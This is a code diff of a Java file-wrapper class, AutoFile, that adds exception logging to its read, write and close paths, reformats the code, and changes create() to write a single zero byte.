@@ -72,9 +72,11 @@ public final class AutoFile {
 	public byte[] read(final int offset) {
 		final int length = (int) file.length() - offset;
 		InputStream in = null;
-		if (Cfg.DEBUG) { Check.asserts(file!=null, " (read) Assert failed, null file"); }
-		
-		if(length==0){
+		if (Cfg.DEBUG) {
+			Check.asserts(file != null, " (read) Assert failed, null file");
+		}
+
+		if (length == 0) {
 			return null;
 		}
 		try {
@@ -84,8 +86,12 @@ public final class AutoFile {
 			in.read(buffer, 0, length);
 			return buffer;
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(e) ;//$NON-NLS-1$
+				Check.log(e);//$NON-NLS-1$
 			}
 
 		} finally {
@@ -93,8 +99,12 @@ public final class AutoFile {
 				try {
 					in.close();
 				} catch (final IOException e) {
+					if (Cfg.EXCEPTION) {
+						Check.log(e);
+					}
+
 					if (Cfg.DEBUG) {
-						Check.log(e) ;//$NON-NLS-1$
+						Check.log(e);//$NON-NLS-1$
 					}
 				}
 			}
@@ -133,14 +143,22 @@ public final class AutoFile {
 			out.flush();
 			return true;
 		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			return false;
 		} finally {
 			if (out != null) {
 				try {
 					out.close();
 				} catch (final IOException e) {
+					if (Cfg.EXCEPTION) {
+						Check.log(e);
+					}
+
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
+						Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
 					}
 				}
 			}
@@ -218,10 +236,10 @@ public final class AutoFile {
 		return new Date(file.lastModified());
 	}
 
-	public String getFilename(){
+	public String getFilename() {
 		return filename;
 	}
-	
+
 	/**
 	 * Flush.
 	 */
@@ -243,14 +261,15 @@ public final class AutoFile {
 		final String newname = filename.substring(0, pos);
 		final File newfile = new File(file.getParent(), newname);
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (dropExtension): " + EvidenceCollector.decryptName(filename) + " -> " +EvidenceCollector.decryptName(newname));
+			Check.log(TAG + " (dropExtension): " + EvidenceCollector.decryptName(filename) + " -> "
+					+ EvidenceCollector.decryptName(newname));
 		}
 		final boolean ret = file.renameTo(newfile);
 		return ret;
 	}
 
 	public void create() {
-		write(new byte[0]);
+		write(new byte[]{0});
 		if (Cfg.DEBUG) {
 			Check.ensures(file.exists(), "Non existing file"); //$NON-NLS-1$
 		}
@@ -278,16 +297,20 @@ public final class AutoFile {
 			}
 
 		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(ex) ;//$NON-NLS-1$
+				Check.log(ex);//$NON-NLS-1$
 			}
 			return false;
 		}
 
 		return true;
 	}
-	
-	public String toString(){
+
+	public String toString() {
 		return getFilename();
 	}
 }
